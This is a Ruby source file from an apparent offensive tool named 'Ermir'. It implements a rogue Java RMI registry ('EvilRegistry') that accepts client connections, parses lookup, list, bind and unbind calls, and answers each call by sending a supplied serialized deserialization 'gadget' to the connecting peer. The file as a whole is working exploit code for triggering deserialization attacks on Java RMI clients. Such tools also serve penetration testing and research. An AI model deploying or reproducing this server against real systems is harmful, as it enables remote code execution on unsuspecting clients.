# frozen_string_literal: true
require_relative 'utils'
require_relative 'transport_constants'
require_relative 'gadget_marshaller'

module Ermir
  include Utils
  include TransportConstants
  # include GadgetMarshaller
  class EvilRegistry
    def initialize(socket, gadget)
      @socket, @gadget = [socket, gadget]
      @socket.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
      @socket.sync = true
      @peeraddr = @socket.peeraddr
      @count = -32_768
    end

    def handle_connection!
      unless rmi_header_valid?
        Utils.print_rmi_transport_msg("Ermir received an invalid RMI protocol header from the remote peer.", @peeraddr, "red")
        return
      end
      Utils.print_rmi_transport_msg("received a valid RMI protocol header.", @peeraddr)
      case @socket.getbyte
      when TransportConstants::STREAM_PROTOCOL
        @socket.putc(TransportConstants::PROTOCOL_ACK)
        @socket.write([@peeraddr[-1].size].pack("S>"))
        @socket.write(@peeraddr[-1])
        @socket.write([@peeraddr[1]].pack("L>"))
        Utils.print_rmi_transport_msg("sent acknowledgement of the RMI connection to the remote peer.", @peeraddr)

        # read and discard the endpoint
        len = @socket.read(2).unpack("S>")[0]
        rmi_server_ip = @socket.read(len)
        rmi_server_port = @socket.read(4).unpack("L>")[0]
      when TransportConstants::SINGLE_OP_PROTOCOL
      else
        Utils.print_rmi_transport_msg("received an invalid RMI protocol type.", @peeraddr, "red")
      end
      unless rmi_message_valid?
        Utils.print_rmi_transport_msg("received an invalid RMI message.", @peeraddr, "red")
        return
      end
      Utils.print_rmi_transport_msg("received a valid RMI message header from remote peer.", @peeraddr)
      _ = @socket.read(22)
      op = @socket.read(4).unpack("L>")[0]
      interface_hash = @socket.read(8).unpack("Q>")[0]

      unless interface_hash.eql?(rmi_server_port.zero? ? TransportConstants::INTERFACE_STUB_HASH : TransportConstants::INTERFACE_SKEL_HASH)
        Utils.print_rmi_transport_msg("received an incorrect Registry interface hash.", @peeraddr, "red")
        return
      end
      if (0..4).include?(op)
        ret = self.send("handle_#{TransportConstants::OPS[op]}")
        if ret.is_a?(String)
          Utils.print_rmi_transport_msg("error: #{ret}.", @peeraddr, "red")
        end
      else
        Utils.print_rmi_transport_msg("error: received an invalid RMI CALL OP.", @peeraddr, "red")
      end

    end

    def close_connection!
      @socket.close
    end

    private
    def rmi_header_valid?
      @socket.read(4).unpack("L>")[0].eql?(TransportConstants::MAGIC) \
        && @socket.read(2).unpack("S>")[0].eql?(TransportConstants::VERSION)
    end

    def rmi_message_valid?
      @socket.getbyte.eql?(TransportConstants::CALL) \
          && Utils.stream_header_valid?(@socket.read(4)) \
          && @socket.getbyte.eql?(TransportConstants::TC_BLOCKDATA) \
          && @socket.getbyte.eql?(0x22)
    end

    def handle_lookup
      unless @socket.getbyte.eql?(TransportConstants::TC_STRING)
        return "received a corrupted RMI message"
      end
      len = @socket.read(2).unpack("S>")[0]
      lookup_key = @socket.read(len)
      Utils.print_rmi_transport_msg("Ermir.lookup(#{lookup_key.inspect}) was called by the remote peer.", @peeraddr)
      write_return_block
      write_object
    end

    def handle_list
      Utils.print_rmi_transport_msg("Ermir.list() was called by the remote peer.", @peeraddr)
      write_return_block
      write_object
    end

    def handle_bind(rebind: false)
      unless @socket.getbyte.eql?(TransportConstants::TC_STRING)
        return "received a corrupted RMI message" # first bind() arg is always TC_STRING
      end
      bind_key_size = @socket.read(2).unpack("S>")[0]
      bind_key = @socket.read(bind_key_size)
      case @socket.getbyte
      when TransportConstants::TC_OBJECT
        case @socket.getbyte
        when TransportConstants::TC_PROXYCLASSDESC
          interfaces_count = @socket.read(4).unpack("L>")[0]
          implemented_interfaces = []
          interfaces_count.times do
            interface_name_size = @socket.read(2).unpack("S>")[0]
            return "the received interface name length exceeds the max length" if interface_name_size > 100
            implemented_interfaces << @socket.read(interface_name_size)
          end
          if implemented_interfaces[0] == "java.rmi.Remote"
            Utils.print_rmi_transport_msg("Ermir.#{rebind && 're' || ''}bind(#{bind_key.inspect}, new <class (?) implements #{implemented_interfaces[1]}>()) was called by the remote peer.", @peeraddr)
          else
            Utils.print_rmi_transport_msg("Ermir.#{rebind && 're' || ''}bind(#{bind_key.inspect}, <java.lang.reflect.Proxy handling <#{implemented_interfaces*', '}> interfaces>) was called by the remote peer.", @peeraddr)
          end
        when TransportConstants::TC_CLASSDESC
          class_name_size = @socket.read(2).unpack("S>")[0]
          return "the received class name length exceeds the max length" if class_name_size > 100
          class_name = @socket.read(class_name_size)
          if class_name == "com.sun.jndi.rmi.registry.ReferenceWrapper_Stub"
            Utils.print_rmi_transport_msg("Ermir.#{rebind && 're' || ''}bind(#{bind_key.inspect}, Reference(\"className\")) was called by the remote peer.", @peeraddr)
          else
            Utils.print_rmi_transport_msg("Ermir.#{rebind && 're' || ''}bind(#{bind_key.inspect}, #{class_name}) was called by the remote peer.", @peeraddr)
          end
        else
          return "received a corrupted/unimplemented RMI message body"
        end
      else
        return "received an corrupted/unimplemented object"
      end
      write_return_block normal_return: false
      write_object
    end

    def handle_rebind
      handle_bind(rebind: true)
    end

    def handle_unbind
      unless @socket.getbyte.eql?(TransportConstants::TC_STRING)
        return "received a corrupted RMI message"
      end
      len = @socket.read(2).unpack("S>")[0]
      unbind_key = @socket.read(len)
      Utils.print_rmi_transport_msg("Ermir.unbind(#{unbind_key.inspect}) was called by the remote peer.", @peeraddr)
      write_return_block(normal_return: false)
      write_object
    end

    def write_return_block(normal_return: true)
      block_size = 0xf
      @socket.putc(TransportConstants::RETURN)
      @socket.write([TransportConstants::OBJECT_STREAM_MAGIC].pack("L>"))
      @socket.putc(TransportConstants::TC_BLOCKDATA)
      @socket.putc(block_size)
      @socket.putc(normal_return ? TransportConstants::NORMAL_RETURN : TransportConstants::EXCEPTIONAL_RETURN)
      write_uid
    end

    def write_uid
      @socket.write([Time.now.to_i].pack("L>"))
      @socket.write([Time.now.to_i].pack("Q>"))
      @count = (@count == 32_767) ? -32_768 : @count.next
      @socket.write([@count].pack("S>"))
    end

    def write_object
      # patch_gadget!
      object = @gadget[4..]
      @socket.write(object)
      @socket.flush
      Utils.print_rmi_transport_msg("sent the gadget to the remote peer.", @peeraddr)
    end
  end
end
